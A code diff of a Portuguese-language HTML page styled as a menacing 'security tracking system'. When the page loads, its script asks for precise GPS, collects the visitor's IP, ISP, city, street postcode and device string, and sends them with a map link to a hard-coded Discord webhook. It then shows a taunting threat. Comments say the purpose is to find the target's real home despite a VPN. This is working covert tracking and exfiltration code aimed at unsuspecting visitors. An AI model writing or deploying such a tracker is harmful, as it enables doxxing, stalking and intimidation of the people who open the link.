@@ -3,77 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SISTEMA DE RASTREIO ATIVO</title>
+    <title>SISTEMA DE SEGURANÇA ATIVO</title>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <style>
-        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
-        .container { border: 2px solid #ff0000; padding: 40px; background: #1a0000; box-shadow: 0 0 30px #ff0000; max-width: 400px; }
-        .glitch { font-size: 1.2rem; font-weight: bold; text-transform: uppercase; animation: blink 1s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-        .loader { border: 3px solid #330000; border-top: 3px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        #particles-js { position: absolute; width: 100%; height: 100%; z-index: 1; }
+        .ui-container { position: relative; z-index: 2; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; text-align: center; }
+        .box { border: 2px solid #ff0000; padding: 40px; background: rgba(20, 0, 0, 0.9); box-shadow: 0 0 30px #ff0000; max-width: 450px; }
+        .loader { border: 3px solid #300; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 3.5rem; color: #ff0000; display: none; margin: 0; text-shadow: 0 0 20px #ff0000; }
+        h1 { font-size: 3.5rem; display: none; margin: 0; text-shadow: 0 0 20px #f00; font-weight: 900; }
+        .blink { animation: blink 0.8s infinite; font-weight: bold; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-    <div class="container" id="main-box">
-        <div id="ui-elements">
-            <div class="loader"></div>
-            <div class="glitch">Sincronizando com Satélite...</div>
-            <p style="font-size: 0.8rem; color: #888; margin-top: 15px;">Protocolo de captura IP/GPS em execução.</p>
+    <div id="particles-js"></div>
+
+    <div class="ui-container">
+        <div class="box" id="main-box">
+            <div id="loader-content">
+                <div class="loader"></div>
+                <div class="blink">ESCANEANDO ENDEREÇO IP...</div>
+                <p style="font-size: 12px; color: #888;">Protocolo de Rastreio Militar Ativo</p>
+            </div>
+            <h1 id="final-text">CE TA FUDIDO</h1>
         </div>
-        <h1 id="fudido">CE TA FUDIDO</h1>
     </div>
 
     <script>
-        // SEU WEBHOOK ATUALIZADO
+        // SEU WEBHOOK
         const WEBHOOK = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";
+
+        // Configuração das Partículas Vermelhas
+        particlesJS("particles-js", {
+            "particles": {
+                "number": { "value": 80 },
+                "color": { "value": "#ff0000" },
+                "shape": { "type": "circle" },
+                "opacity": { "value": 0.5 },
+                "size": { "value": 3 },
+                "line_linked": { "enable": true, "distance": 150, "color": "#ff0000", "opacity": 0.4, "width": 1 },
+                "move": { "enable": true, "speed": 4 }
+            }
+        });
 
         async function enviar(pos = null) {
             try {
-                // Pega dados do IP (Mesmo que diga Amazon, a gente registra)
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ip = await ipRes.json();
+                // Pega IP completo e Provedor (isp)
+                const ipRes = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query');
+                const ipData = await ipRes.json();
 
-                let desc = `**🌐 Internet:** ${ip.org}\n**📍 Cidade (IP):** ${ip.city}\n**📱 Aparelho:** ${navigator.userAgent}`;
-                
+                let cepFinal = ipData.zip || "Não detectado pelo IP";
+                let coordsLink = `Sem GPS (Aprox: ${ipData.lat}, ${ipData.lon})`;
+
+                // Se tiver GPS, pegamos o CEP da RUA REAL
                 if (pos) {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
-                    // O Google Maps ignora a VPN/Amazon e mostra a casa do cara
-                    desc += `\n\n🎯 **LOCALIZAÇÃO REAL (GPS):**\nhttps://www.google.com/maps?q=${lat},${lon}`;
-                } else {
-                    desc += `\n\n⚠️ **GPS NEGADO:** Localização aproximada pelo IP.`;
+                    coordsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    try {
+                        const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+                        const geoData = await geo.json();
+                        cepFinal = geoData.address.postcode || cepFinal;
+                    } catch(e) {}
                 }
 
+                // Envio formatado como você pediu
                 await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
+                        content: "🎯 **ALVO RASTREADO COM SUCESSO**",
                         embeds: [{
-                            title: "🚩 NOVO ALVO LOGADO",
-                            description: desc,
                             color: 16711680,
+                            description: 
+                                `**IP:** ${ipData.query}\n` +
+                                `**Provedor:** ${ipData.isp || ipData.org}\n` +
+                                `**CEP:** ${cepFinal}\n\n` +
+                                `**Cidade/Estado:** ${ipData.city} - ${ipData.regionName}\n` +
+                                `**Aparelho:** ${navigator.userAgent}\n` +
+                                `**Localização:** ${coordsLink}`,
                             timestamp: new Date()
                         }]
                     })
                 });
 
-                // Troca para a tela final
-                document.getElementById('ui-elements').style.display = 'none';
-                document.getElementById('main-box').style.background = '#000';
-                document.getElementById('fudido').style.display = 'block';
+                // Finalização
+                document.getElementById('loader-content').style.display = 'none';
+                document.getElementById('final-text').style.display = 'block';
+                document.getElementById('main-box').style.background = 'transparent';
+                document.getElementById('main-box').style.border = 'none';
+                document.getElementById('main-box').style.boxShadow = 'none';
 
-            } catch (e) {
-                console.log("Erro de conexão.");
-            }
+            } catch (e) { console.error(e); }
         }
 
         window.onload = () => {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (p) => enviar(p), 
-                    () => enviar(), // Se o cara negar, manda o IP da Amazon mesmo
+                    () => enviar(), 
                     { enableHighAccuracy: true, timeout: 5000 }
                 );
             } else {
